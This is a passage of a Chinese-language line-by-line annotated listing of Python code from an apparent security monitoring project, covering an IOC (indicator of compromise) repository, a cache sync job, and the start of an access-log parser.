| 56 | 返回结果：把处理后的值交回调用方。 | `        return IOC` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `find_active_dict` 的输入、处理逻辑和返回结果。 | `    def find_active_dict(` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, ioc_type: str, value: str, *, now: Optional[datetime] = None` |
| 60 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Optional[Dict[str, Any]]:` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        IOC = self._model()` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = now or utc_now()` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        canon = _canonical_value(ioc_type, value)` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = (` |
| 65 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.session.query(IOC)` |
| 66 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .filter(` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                IOC.ioc_type == ioc_type,` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                IOC.value == canon,` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .one_or_none()` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 72 | 条件判断：满足条件时进入对应分支。 | `        if row is None:` |
| 73 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 74 | 条件判断：满足条件时进入对应分支。 | `        if row.expires_at is not None and row.expires_at <= now:` |
| 75 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 76 | 返回结果：把处理后的值交回调用方。 | `        return self._row_to_dict(row)` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 函数定义：声明 `list_active_dicts` 的输入、处理逻辑和返回结果。 | `    def list_active_dicts(self, *, now: Optional[datetime] = None) -> List[Dict[str, Any]]:` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        IOC = self._model()` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = now or utc_now()` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        q = self.session.query(IOC).filter(` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `            (IOC.expires_at.is_(None)) \| (IOC.expires_at > now)` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 84 | 返回结果：把处理后的值交回调用方。 | `        return [self._row_to_dict(r) for r in q.all()]` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 87 | 函数定义：声明 `_row_to_dict` 的输入、处理逻辑和返回结果。 | `    def _row_to_dict(row: Any) -> Dict[str, Any]:` |
| 88 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "id": row.id,` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ioc_type": row.ioc_type,` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "value": row.value,` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "sources": list(row.sources or []),` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reason": row.reason or "",` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "note": row.note or "",` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "score": row.score,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ttl_seconds": row.ttl_seconds,` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "first_seen": row.first_seen,` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "last_seen": row.last_seen,` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "expires_at": row.expires_at,` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "metadata": row.ioc_meta,` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "hits": row.hits,` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "added_at": row.added_at,` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "updated_at": row.updated_at,` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 105 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 106 | 函数定义：声明 `upsert_merge` 的输入、处理逻辑和返回结果。 | `    def upsert_merge(` |
| 107 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ioc_type: str,` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        value: str,` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source: str,` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        score: Optional[int] = None,` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ttl_seconds: Optional[int] = None,` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reason: Optional[str] = None,` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        note: Optional[str] = None,` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        metadata: Optional[Dict[str, Any]] = None,` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now: Optional[datetime] = None,` |
| 118 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 119 | 文档字符串：说明当前模块、类或函数的职责。 | `        """同 type+value 合并 sources，保留更高 score 与更近的过期时间（更长 TTL）。"""` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        IOC = self._model()` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = now or utc_now()` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        canon = _canonical_value(ioc_type, value)` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src = (source or "manual").strip() or "manual"` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = (` |
| 125 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.session.query(IOC)` |
| 126 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .filter(IOC.ioc_type == ioc_type, IOC.value == canon)` |
| 127 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .one_or_none()` |
| 128 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 129 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 130 | 函数定义：声明 `_merge_expires` 的输入、处理逻辑和返回结果。 | `        def _merge_expires(` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            existing_exp: Optional[datetime], new_ttl: Optional[int]` |
| 132 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ) -> Optional[datetime]:` |
| 133 | 文档字符串：说明当前模块、类或函数的职责。 | `            """合并后保留更晚的 \`\`expires_at\`\`（更长有效期）。"""` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            cand: Optional[datetime] = None` |
| 135 | 条件判断：满足条件时进入对应分支。 | `            if new_ttl is not None and new_ttl > 0:` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                cand = now + timedelta(seconds=int(new_ttl))` |
| 137 | 条件判断：满足条件时进入对应分支。 | `            if existing_exp is None:` |
| 138 | 返回结果：把处理后的值交回调用方。 | `                return cand` |
| 139 | 条件判断：满足条件时进入对应分支。 | `            if cand is None:` |
| 140 | 返回结果：把处理后的值交回调用方。 | `                return existing_exp` |
| 141 | 返回结果：把处理后的值交回调用方。 | `            return cand if cand >= existing_exp else existing_exp` |
| 142 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta_merged: Optional[Dict[str, Any]] = None` |
| 144 | 条件判断：满足条件时进入对应分支。 | `        if row is None:` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            exp = _merge_expires(None, ttl_seconds)` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            meta_merged = dict(metadata) if metadata else None` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = IOC(` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                id=uuid.uuid4().hex,` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ioc_type=ioc_type,` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                value=canon,` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                sources=[src],` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                reason=reason or "",` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                note=note or "",` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                score=score,` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ttl_seconds=ttl_seconds,` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                first_seen=now,` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                last_seen=now,` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                expires_at=exp,` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ioc_meta=meta_merged,` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                hits=0,` |
| 161 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 162 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.session.add(row)` |
| 163 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row.sources = merge_source_lists(row.sources, [src])` |
| 165 | 条件判断：满足条件时进入对应分支。 | `            if reason:` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row.reason = reason` |
| 167 | 条件判断：满足条件时进入对应分支。 | `            if note is not None:` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row.note = note` |
| 169 | 条件判断：满足条件时进入对应分支。 | `            if score is not None:` |
| 170 | 条件判断：满足条件时进入对应分支。 | `                if row.score is None or score > int(row.score):` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    row.score = int(score)` |
| 172 | 条件判断：满足条件时进入对应分支。 | `            if ttl_seconds is not None:` |
| 173 | 条件判断：满足条件时进入对应分支。 | `                if row.ttl_seconds is None or ttl_seconds > int(row.ttl_seconds or 0):` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    row.ttl_seconds = int(ttl_seconds)` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row.expires_at = _merge_expires(row.expires_at, ttl_seconds)` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row.last_seen = now` |
| 177 | 条件判断：满足条件时进入对应分支。 | `            if row.first_seen is None:` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row.first_seen = now` |
| 179 | 条件判断：满足条件时进入对应分支。 | `            if metadata:` |
| 180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                base = row.ioc_meta if isinstance(row.ioc_meta, dict) else {}` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                merged = {**base, **metadata}` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                row.ioc_meta = merged` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                meta_merged = merged` |
| 184 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 185 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.session.flush()` |
| 186 | 返回结果：把处理后的值交回调用方。 | `        return self._row_to_dict(row)` |
| 187 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 188 | 函数定义：声明 `delete` 的输入、处理逻辑和返回结果。 | `    def delete(self, ioc_type: str, value: str) -> bool:` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        IOC = self._model()` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        canon = _canonical_value(ioc_type, value)` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = (` |
| 192 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.session.query(IOC)` |
| 193 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .filter(IOC.ioc_type == ioc_type, IOC.value == canon)` |
| 194 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .one_or_none()` |
| 195 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 196 | 条件判断：满足条件时进入对应分支。 | `        if row is None:` |
| 197 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 198 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.session.delete(row)` |
| 199 | 返回结果：把处理后的值交回调用方。 | `        return True` |

## `src/collectors/ioc_sync.py`

- 类型：后端采集
- 行数：87

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `IOC 同步任务入口（cron / APScheduler / 手工执行）。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `用法::` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python -m src.collectors.ioc_sync` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `在 Flask 应用上下文中：将数据库中未过期 IOC 刷新到 \`\`ThreatIntelCollector\`\` 内存缓存。` |
| 9 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 10 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import argparse` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, Optional` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))` |
| 19 | 条件判断：满足条件时进入对应分支。 | `if _PROJECT_ROOT not in sys.path:` |
| 20 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, _PROJECT_ROOT)` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 函数定义：声明 `run_ioc_sync` 的输入、处理逻辑和返回结果。 | `def run_ioc_sync(` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app: Any,` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    purge_expired: bool = False,` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, Any]:` |
| 28 | 文档字符串：说明当前模块、类或函数的职责。 | `    """供调度器调用：刷新威胁情报内存缓存；可选清理过期行。` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Args:` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        app: \`\`create_app()\`\` 返回的 Flask 应用。` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        purge_expired: 为 True 时从数据库删除已过期 IOC（慎用，默认仅停止命中）。` |
| 33 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 34 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 35 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import IOC` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ti = app.extensions.get("guardian_threat_intel")` |
| 38 | 条件判断：满足条件时进入对应分支。 | `    if ti is None:` |
| 39 | 返回结果：把处理后的值交回调用方。 | `        return {"ok": False, "reason": "threat_intel_missing"}` |
| 40 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    removed = 0` |
| 42 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 43 | 条件判断：满足条件时进入对应分支。 | `        if purge_expired:` |
| 44 | 导入对象：从指定模块引入类、函数或常量。 | `            from src.collectors.ioc_repository import utc_now` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            now = utc_now()` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            stale = (` |
| 48 | 函数调用：执行已有函数/方法完成当前步骤。 | `                db.session.query(IOC)` |
| 49 | 函数调用：执行已有函数/方法完成当前步骤。 | `                .filter(` |
| 50 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    IOC.expires_at.isnot(None),` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    IOC.expires_at <= now,` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `                .all()` |
| 54 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            removed = len(stale)` |
| 56 | 循环：逐个处理集合或迭代器中的元素。 | `            for row in stale:` |
| 57 | 函数调用：执行已有函数/方法完成当前步骤。 | `                db.session.delete(row)` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.commit()` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        loaded = ti.refresh_local_from_db()` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 返回结果：把处理后的值交回调用方。 | `    return {"ok": True, "loaded": loaded, "removed_expired": removed}` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main(argv: Optional[list[str]] = None) -> int:` |
| 66 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logging.basicConfig(` |
| 67 | 日志记录：输出运行状态、调试信息或异常线索。 | `        level=logging.INFO,` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        format="[%(asctime)s] %(name)s - %(levelname)s - %(message)s",` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parser = argparse.ArgumentParser(description="IOC 同步：DB → ThreatIntelCollector 内存")` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--purge-expired",` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action="store_true",` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="同时从数据库删除已过期 IOC（默认只刷新缓存，不删行）",` |
| 75 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    args = parser.parse_args(argv)` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    result = run_ioc_sync(app, purge_expired=args.purge_expired)` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print(result)` |
| 83 | 返回结果：把处理后的值交回调用方。 | `    return 0 if result.get("ok") else 1` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 87 | 抛出异常：主动报告不可继续的错误。 | `    raise SystemExit(main())` |

## `src/collectors/log_collector.py`

- 类型：后端采集
- 行数：125

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `日志采集器 - 支持增量读取系统日志与 Web access.log` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §3.2 数据源` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `职责：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 按文件增量（tell/seek）方式读取日志，避免重复扫描全文件` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 将 Apache/Nginx access.log 解析成结构化字典` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 将 /var/log/auth.log 等 syslog 风格行解析成结构化字典` |
| 9 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 10 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 14 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import List, Optional` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 类定义：声明 `LogCollector`，封装相关状态与行为。 | `class LogCollector:` |
| 21 | 文档字符串：说明当前模块、类或函数的职责。 | `    """日志文件采集器（支持增量读取）"""` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 注释：解释下面或当前这段代码的设计意图。 | `    # Apache / Nginx access.log：核心行 + 可选 Combined Log 尾部 referer / user-agent` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ACCESS_LOG_CORE = re.compile(` |
| 25 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r'(?P<ip>\S+) \S+ \S+ \[(?P<time>[^\]]+)\] '` |
| 26 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r'"(?P<method>\S+) (?P<url>\S+) \S+" '` |
| 27 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r'(?P<status>\d+) (?P<size>-\|\d+)'` |
| 28 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 29 | 注释：解释下面或当前这段代码的设计意图。 | `    # Combined: ... size "referer" "user-agent"` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ACCESS_LOG_COMBINED_TAIL = re.compile(` |
| 31 | 函数调用：执行已有函数/方法完成当前步骤。 | `        r'^\s*"(?P<referer>(?:[^"\\]\|\\.)*)"\s+"(?P<user_agent>(?:[^"\\]\|\\.)*)"\s*$'` |
| 32 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, log_path: str, log_type: str = 'web'):` |
| 35 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            log_path: 日志文件绝对路径` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            log_type: 日志类型，支持 'web' \| 'system' \| 'app'` |
| 39 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.log_path = log_path` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.log_type = log_type` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_position: int = 0` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 函数定义：声明 `read_new_lines` 的输入、处理逻辑和返回结果。 | `    def read_new_lines(self) -> List[dict]:` |
| 45 | 文档字符串：说明当前模块、类或函数的职责。 | `        """读取自上次调用以来的新增行，已解析为结构化字典"""` |
| 46 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.exists(self.log_path):` |
| 47 | 返回结果：把处理后的值交回调用方。 | `            return []` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results: List[dict] = []` |
| 50 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 51 | 上下文管理：自动管理资源打开与释放。 | `            with open(self.log_path, 'r', encoding='utf-8', errors='ignore') as f:` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `                f.seek(self._last_position)` |
| 53 | 循环：逐个处理集合或迭代器中的元素。 | `                for line in f:` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    parsed = self._parse_line(line.strip())` |
| 55 | 条件判断：满足条件时进入对应分支。 | `                    if parsed:` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        results.append(parsed)` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._last_position = f.tell()` |
| 58 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except IOError as exc:` |
| 59 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error(f"[LogCollector] 读取日志失败: {exc}")` |
| 60 | 返回结果：把处理后的值交回调用方。 | `        return results` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 函数定义：声明 `_parse_line` 的输入、处理逻辑和返回结果。 | `    def _parse_line(self, line: str) -> Optional[dict]:` |
| 63 | 文档字符串：说明当前模块、类或函数的职责。 | `        """根据 log_type 分派到具体解析方法"""` |
| 64 | 条件判断：满足条件时进入对应分支。 | `        if not line:` |
| 65 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 66 | 条件判断：满足条件时进入对应分支。 | `        if self.log_type == 'web':` |
| 67 | 返回结果：把处理后的值交回调用方。 | `            return self._parse_web_log(line)` |
| 68 | 条件判断：满足条件时进入对应分支。 | `        if self.log_type == 'system':` |
| 69 | 返回结果：把处理后的值交回调用方。 | `            return self._parse_system_log(line)` |
| 70 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 函数定义：声明 `_parse_web_log` 的输入、处理逻辑和返回结果。 | `    def _parse_web_log(self, line: str) -> Optional[dict]:` |
| 73 | 文档字符串：说明当前模块、类或函数的职责。 | `        """解析 Apache/Nginx access.log 格式（含可选 referer / user-agent）。"""` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        match = self.ACCESS_LOG_CORE.match(line)` |
| 75 | 条件判断：满足条件时进入对应分支。 | `        if not match:` |
